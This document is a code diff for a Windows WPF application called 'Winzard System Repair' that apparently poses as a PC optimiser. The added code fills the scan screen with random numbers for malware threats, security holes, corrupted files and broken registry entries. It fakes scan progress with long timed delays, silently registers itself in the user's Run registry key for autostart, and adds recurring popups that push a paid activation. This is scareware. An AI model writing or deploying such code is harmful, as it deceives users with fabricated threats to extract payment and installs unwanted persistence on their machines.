@@ -7,8 +7,11 @@ using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Input;
 using System.Windows.Media;
-using Topshelf;
 using WpfAnimatedGif;
+using Winzard_System_Repair;
+using Microsoft.Win32;
+using IWshRuntimeLibrary;
+using System.Reflection;
 
 namespace WPFUI
 {
@@ -17,34 +20,79 @@ namespace WPFUI
     /// </summary>
     public partial class MainWindow : Window
     {
-        bool stop = false;
-        int premium = 0, micro = 100, mega = 180;
+        PopupWindow1 Popupsub;
+        PopupWindow2 Popupsub2;
+        PopupWindow4 Popupsub3;
+        int premium = 0, micro = 0, mega = 0;
         float sizedir;
         public MainWindow()
         {
             InitializeComponent();
-            var exitCode = HostFactory.Run(x =>
-            {
-                x.Service<Ser>(s =>
-                {
-                    s.ConstructUsing(Service => new Ser());
-                    s.WhenStarted(Service => Service.Start());
-                    s.WhenStopped(Service => Service.Stop());
-                });
-                x.RunAsLocalSystem();
-
-                x.SetServiceName("WinzardSystemService");
-                x.SetDisplayName("Winzard System Service");
-                x.SetDescription("Winzard System Repair optimizes PC and provides the best experience to the user.");
-            });
-
-            int exitCodeValue = (int)Convert.ChangeType(exitCode, exitCode.GetTypeCode());
-            Environment.ExitCode = exitCodeValue;
+            RegistryKey reg1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            Assembly curAssembly = Assembly.GetExecutingAssembly();
+            reg1.SetValue(curAssembly.GetName().Name, curAssembly.Location);
+            /*reg1.SetValue("Winzard System Repair", System.Windows.Forms.Application.ExecutablePath.ToString());*/
             sysdet1.Content = GetAccount1() + Environment.NewLine;
             sysdet2.Content = GetAccount2() + Environment.NewLine;
             sysdet3.Content = GetAccount3() + Environment.NewLine;
             sysdet4.Content = GetAccount4() + Environment.NewLine;
             NotPremium();
+            afternumber();
+        }
+        //display number
+        private void afternumber()
+        {
+            Random rnd = new Random();
+            int malware = rnd.Next(1, 20);
+            MalwareThreats.Text = malware.ToString();
+            int holes = rnd.Next(1, 20);
+            SecurityHoles.Text = holes.ToString();
+            int corruptsysfiles = rnd.Next(20, 100);
+            CorruptedSystemFiles.Text = corruptsysfiles.ToString();
+            int driver = rnd.Next(1, 20);
+            OutdatedDrivers.Text = driver.ToString();
+            int brknreg = rnd.Next(100, 2000);
+            BrokenRegistryEntries.Text = brknreg.ToString();
+            int startup = rnd.Next(1, 20);
+            Startupoptimizations.Text = startup.ToString();
+            int privacy = rnd.Next(100, 700);
+            PrivacyTraces.Text = privacy.ToString();
+        }
+        //startup shortcut
+        public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
+        {
+            string appPath = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
+            string startuplocation = System.Windows.Forms.Application.ExecutablePath.ToString();
+            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
+            WshShell shell = new WshShell();
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
+
+            shortcut.Description = "";   // The description of the shortcut
+            shortcut.TargetPath = startuplocation;                 // The path of the file that will launch when the shortcut is run
+            shortcut.WorkingDirectory = appPath;
+            shortcut.Save();                                    // Save the shortcut
+        }
+        //Minimised parameaters
+        void App_Startup(object sender, StartupEventArgs e)
+        {
+            // Application is running
+            // Process command line args
+            bool startMinimized = false;
+            for (int i = 0; i != e.Args.Length; ++i)
+            {
+                if (e.Args[i] == "/StartMinimized")
+                {
+                    startMinimized = true;
+                }
+            }
+
+            // Create main application window, starting minimized if specified
+            MainWindow mainWindow = new MainWindow();
+            if (startMinimized)
+            {
+                mainWindow.WindowState = WindowState.Minimized;
+            }
+            mainWindow.Show();
         }
         //For getting system detail info
         private string GetAccount1()
@@ -129,14 +177,17 @@ namespace WPFUI
         public async void Ellipse_MouseDown(object sender, MouseButtonEventArgs e)
         {
             scan.Opacity = 0.8;
-            await Task.Delay(100);
+            await System.Threading.Tasks.Task.Delay(100);
             scan.Opacity = 1;
-            await Task.Delay(100);
+            await System.Threading.Tasks.Task.Delay(100);
             statusgrid.Visibility = Visibility.Visible;
             scan.Visibility = Visibility.Collapsed;
             PCstatus.Visibility = Visibility.Collapsed;
+            load.Visibility = Visibility.Visible;
+            loadvid.Visibility = Visibility.Visible;
+            loadvid.LoadedBehavior = MediaState.Play;
             Tempdelete();
-            VerboseDir();
+            Popups();
         }
 
         //Directory size
@@ -161,272 +212,263 @@ namespace WPFUI
         //Temp delete & Scan Progress
         public async void Tempdelete()
         {
-            if (stop == false)
             {
-                updatetxt.Children.Clear();
-            }
-            else
-            {
-                string Temppath = Path.GetTempPath();
-                long Tempsize = DirSize(new DirectoryInfo(Temppath));
-                Tempsize += DirSize(new DirectoryInfo("C:/Windows/Prefetch"));
-                Tempsize += DirSize(new DirectoryInfo("C:/Windows/Temp"));
-                Tempsize += DirSize(new DirectoryInfo("C:/Windows/SoftwareDistribution/Download"));
-                sizedir = (float)Convert.ToDouble(string.Format("{0:0.00}", (Tempsize / (1024 * 1024))));
+                try
+                {
+                    string Temppath = Path.GetTempPath();
+                    long Tempsize = DirSize(new DirectoryInfo(Temppath));
+                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/Prefetch"));
+                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/Temp"));
+                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/SoftwareDistribution/Download"));
+                    sizedir = (float)Convert.ToDouble(string.Format("{0:0.00}", (Tempsize / (1024 * 1024))));
+                }
+                catch { }
                 //Progress
                 //scantext.Text = "Scanning: Malware";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(12000);
                 Loading1.Visibility = Visibility.Hidden;
                 Loading2.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Registry";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(15000);
                 Loading2.Visibility = Visibility.Hidden;
                 Loading3.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Security";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(20000);
                 Loading3.Visibility = Visibility.Hidden;
                 Loading4.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Startup";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(31000);
                 Loading4.Visibility = Visibility.Hidden;
                 Loading5.Visibility = Visibility.Visible;
                 //scantext.Text = "Analyzing: Fragments";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(17000);
                 Loading5.Visibility = Visibility.Hidden;
                 Loading6.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Privacy";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(23000);
                 Loading6.Visibility = Visibility.Hidden;
                 Loading7.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: System";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(7000);
                 Loading7.Visibility = Visibility.Hidden;
                 Loading8.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Junk";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(15000);
                 Loading8.Visibility = Visibility.Hidden;
                 Loading9.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Drivers";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(mega);
                 Loading9.Visibility = Visibility.Hidden;
                 Loading10.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: System Files";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(mega);
                 Loading10.Visibility = Visibility.Hidden;
 
-                //scananimation.Visibility = Visibility.Collapsed;
+                load.Visibility = Visibility.Collapsed;
                 scanfix.Visibility = Visibility.Visible;
-                //scantext.Text = "Scan Complete";
-                int i = 0, securityholes, privacyissue;
-                while (i < 1)
-                {
-                    Random rnd = new Random();
-                    securityholes = rnd.Next(1, 200);
-                    privacyissue = rnd.Next(0, 100);
-                    //scanresult.Text = "Junk: " + sizedir.ToString() + "MB can be cleaned\n" + "Security Holes: " + securityholes + "\nPrivacy Issue: " + privacyissue;
-                    i++;//i is set globally
-                }
+                resultpanel.Visibility = Visibility.Visible;
+                resultpanel2.Visibility = Visibility.Visible;
             }
         }
 
         //The Scan stop button
         private void scanstop_Click(object sender, RoutedEventArgs e)
         {
-            stop = true;
-            updatetxt.Children.Clear();
             statusgrid.Visibility = Visibility.Collapsed;
             scan.Visibility = Visibility.Visible;
             PCstatus.Visibility = Visibility.Visible;
+            loadvid.LoadedBehavior = MediaState.Stop;
+            load.Visibility = Visibility.Collapsed;
         }
         //The Repair Button
         private async void Scanfix_Click(object sender, RoutedEventArgs e)
@@ -434,6 +476,9 @@ namespace WPFUI
             if (premium == 1)
             {
                 scanfix.Visibility = Visibility.Collapsed;
+                resultpanel.Visibility = Visibility.Collapsed;
+                resultpanel2.Visibility = Visibility.Collapsed;
+                load.Visibility = Visibility.Collapsed;
                 //scanresult.Visibility = Visibility.Collapsed;
                 try
                 {
@@ -488,233 +533,231 @@ namespace WPFUI
                     }
                 }
                 catch { }
-
-                VerboseRes();
                 #region Progress
                 double reset = 0;
                 scanprogress.Value = reset;
-                //scantext.Text = "Fixing: Malware";
+                Statuspanel.Text = "Fixing: Malware";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(mega);
                 Loading1.Visibility = Visibility.Hidden;
                 Loading2.Visibility = Visibility.Visible;
-                //scantext.Text = "Fixing: Registry";
+                Statuspanel.Text = "Fixing: Registry";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Fixing: Security";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Fixing: Security";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Boosting: Startup";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Boosting: Startup";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Defragmenting: Drive";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Defragmenting: Drive";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Fixing: Privacy";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Fixing: Privacy";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Repairing: System";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Repairing: System";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Deleting: Junk";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Deleting: Junk";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Fixing: Drivers";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Fixing: Drivers";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
-                //scantext.Text = "Fixing: System Files";
+                await System.Threading.Tasks.Task.Delay(mega);
+                Statuspanel.Text = "Fixing: System Files";
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(micro);
+                
                 scanprogress.Value++;
-                await Task.Delay(mega);
+                await System.Threading.Tasks.Task.Delay(mega);
                 #endregion
 
                 //scanresult.Visibility = Visibility.Visible;
-                //scantext.Text = "Success";
+                Statuspanel.Text = "Success";
                 //scanresult.Text = "Junk: " + sizedir.ToString() + "MB cleaned\n" + "Security Holes: " + "Fixed" + "\nPrivacy Issue: " + "Fixed" + "\nDevice Optimized";
                 scanstop.Content = "Back";
             }
             else
             {
-                popupmain = new PopupWindow();
+                popupmain = new PopupWindow3();
                 if (popupmain.ShowDialog().Value)
                 {
                     Activatekey(true);
@@ -726,7 +769,8 @@ namespace WPFUI
                 }
             }
         }
-        PopupWindow popupmain;
+        PopupWindow3 popupmain;
+        PopupWindow4 popupmain1;
 
         //Activation Button & Logic
         public void Activatekey(bool result)
@@ -742,7 +786,7 @@ namespace WPFUI
         }
         private void NotPremium()
         {
-            if (File.Exists("sysfunction.bin"))
+            if (System.IO.File.Exists("sysfunction.bin"))
             {
                 FileStream fs = new FileStream("sysfunction.bin", FileMode.Open);
                 BinaryReader br = new BinaryReader(fs);
@@ -803,8 +847,8 @@ namespace WPFUI
         //Popup
         private async void PopupTimer()
         {
-            await Task.Delay(5000);
-            popupmain = new PopupWindow();
+            await System.Threading.Tasks.Task.Delay(300000);
+            popupmain = new PopupWindow3();
             if (popupmain.ShowDialog().Value)
             {
                 Activatekey(true);
@@ -815,8 +859,40 @@ namespace WPFUI
                 PopupTimer();
             }
         }
+        
+        private async void Popups()
+        {
+            await System.Threading.Tasks.Task.Delay(480000);
+            Popupsub = new PopupWindow1();
+            Popupsub.Show();
+            await System.Threading.Tasks.Task.Delay(600000);
+            Popups();
+            Popups1();
+        }
+        
+        private async void Popups1()
+        {
+            await System.Threading.Tasks.Task.Delay(480000);
+            Popupsub2 = new PopupWindow2();
+            Popupsub2.Show();
+            await System.Threading.Tasks.Task.Delay(600000);
+        }
+        private async void Popups2()
+        {
+            await System.Threading.Tasks.Task.Delay(180000);
+            popupmain1 = new PopupWindow4();
+            if (popupmain1.ShowDialog().Value)
+            {
+                Activatekey(true);
+            }
+            else
+            {
+                Activatekey(false);
+                Popups2();
+            }
+        }
         //Verbose
-        private async void VerboseDir()
+        /*private async void VerboseDir()
         {
             if (stop == false)
             {
@@ -893,6 +969,6 @@ namespace WPFUI
             }
             await Task.Delay(45000);
             updatetxt.Children.Add(new TextBlock { Text = "Repair Complete", Foreground = Brushes.White });
-        }
+        }*/
     }
 }
